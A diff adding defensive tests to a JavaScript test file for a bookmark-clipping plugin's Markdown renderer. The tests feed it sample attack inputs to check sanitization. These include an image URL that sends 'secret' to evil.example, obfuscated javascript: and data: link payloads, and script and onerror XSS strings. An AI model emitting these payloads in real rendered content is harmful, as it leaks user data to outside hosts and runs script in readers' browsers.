@@ -61,20 +61,84 @@ test('the clip is shown only when one was delivered, and limitations stay visibl
   assert.match((await present(saved({ ...fixture, content_markdown: ' ' }))).markdown, /### Overview/);
 });
 
+const showClip = async content_markdown => (await present(saved({ ...fixture, content_markdown }))).markdown;
+
+test('images in clip text never load when the clip is shown', async () => {
+  for (const attack of ['![x](https://evil.example/?q=secret)', '![x][r]\n\n[r]: https://evil.example/p.png', '![`a`](https://evil.example/p.png)']) {
+    assert.doesNotMatch(await showClip(attack), /!\[/, attack);
+  }
+});
+
+test('links in clip text must be HTTP(S), however they are spelled', async () => {
+  for (const attack of [
+    '[x](javascript:alert(1))', '[x](JaVaScRiPt:alert(1))', '[x](<javascript:alert(1)>)', '[[x]](javascript:a((1)))',
+    '[x](javascript&colon;alert(1))', '[x](\njavascript:alert(1))', '[x](data:text/html,hi)', '[x][r]\n\n[r]: javascript:alert(1)',
+  ]) {
+    const clip = (await showClip(attack)).split('### Actions')[0];
+    assert.match(clip, /\]\\[(:]/, attack);
+  }
+});
+
+test('raw HTML in clip text shows as text', async () => {
+  const markdown = await showClip('<img src=x onerror=alert(1)>\n\n<script>alert(1)</script>');
+  assert.doesNotMatch(markdown, /<img|<script/);
+  assert.match(markdown, /&lt;img src=x/);
+});
+
+test('a fence the clip leaves open is closed before the verified links', async () => {
+  for (const [clip, closing] of [['```\nopen', '```'], ['````ts\n```\nopen', '````'], ['~~~\nopen', '~~~']]) {
+    assert.ok((await showClip(clip)).includes(`open\n${closing}\n\n### Actions`), clip);
+  }
+});
+
+test('clip formatting a reader needs survives untouched', async () => {
+  for (const kept of [
+    '[3:10](https://www.youtube.com/watch?v=x&t=190s)', '[wiki](https://en.wikipedia.org/wiki/A_(b))', '**Category:** AI & Agents',
+    '```ts\nconst x: Array<string> = [];\nconst y = "![a](b)";\n```', '~~~\n<b>\n~~~', 'Use `Array<string>` and `![x](y)` here.',
+  ]) {
+    assert.ok((await showClip(kept)).includes(kept), kept);
+  }
+});
+
 test('no host is told to show less than the full clip by default', () => {
   const glean = read('plugins/gleaner/skills/glean/SKILL.md');
   const contract = read('plugins/gleaner/skills/glean/references/bookmark.md');
-  const stepSeven = glean.slice(glean.indexOf('7. **Confirm and preview'), glean.indexOf('**Tagging the chat.**'));
-  const delivery = glean.slice(glean.indexOf('**This conversation** (the default)'), glean.indexOf('**Google Drive**\n'));
-  const present = contract.slice(contract.indexOf('## Present after the save result'), contract.indexOf('## Optional executable renderer'));
-  assert.match(stepSeven, /full clip/);
+  const between = (text, start, end) => {
+    const [from, to] = [text.indexOf(start), text.indexOf(end)];
+    assert.ok(from >= 0 && to > from, `${start} to ${end}`);
+    return text.slice(from, to);
+  };
+  const stepSeven = between(glean, '7. **Confirm and preview', '**Tagging the chat.**');
+  const delivery = between(glean, '**This conversation** (the default)', '**Google Drive**\n');
+  const presentation = between(contract, '## Present after the save result', '## Optional executable renderer');
+  assert.match(stepSeven, /full clip inline, on every host/);
+  assert.match(stepSeven, /short preview/);
+  assert.match(stepSeven, /no preview/);
   assert.doesNotMatch(stepSeven, /In other hosts/);
   assert.doesNotMatch(stepSeven, /In ChatGPT, render/);
   assert.doesNotMatch(delivery, /In other hosts/);
   assert.doesNotMatch(delivery, /ChatGPT only/);
-  assert.doesNotMatch(present, /ChatGPT only/);
-  assert.doesNotMatch(present, /other hosts keep/i);
-  assert.match(present, /every host/i);
+  assert.doesNotMatch(presentation, /ChatGPT only/);
+  assert.doesNotMatch(presentation, /other hosts keep/i);
+  assert.match(presentation, /every host/i);
+  // With no file attached, the inline clip is the only copy, so no opt-out can remove it.
+  assert.match(presentation, /delivery itself: show it once, even with “short preview,” “download only,” or “no preview,”/);
+});
+
+test('a chat clip with no file is shown even on a short or no preview', async () => {
+  const onlyCopy = saved(fixture, { status: 'chat', message: 'No file attached.' });
+  const attached = saved(fixture, { status: 'chat', message: 'Attached.', saved_file: 'sandbox:/mnt/data/clip.md' });
+  for (const mode of ['short', 'none']) {
+    assert.ok((await present(onlyCopy, { mode })).markdown.includes(fixture.content_markdown), mode);
+    assert.equal((await present(attached, { mode })).markdown.includes(fixture.content_markdown), false, mode);
+  }
+});
+
+test('a limitation the clip already states is not repeated', async () => {
+  const linkOnly = JSON.parse(read('scripts/fixtures/youtube-link-only.json'));
+  const { markdown } = await present(saved(linkOnly, { status: 'chat', message: 'Link-only bookmark.' }));
+  assert.equal(markdown.split(linkOnly.limitations[0]).length, 2);
+  assert.doesNotMatch(markdown, /### Source limitations/);
 });
 
 test('Claude Code Markdown and no-component ChatGPT share the same content', async () => {
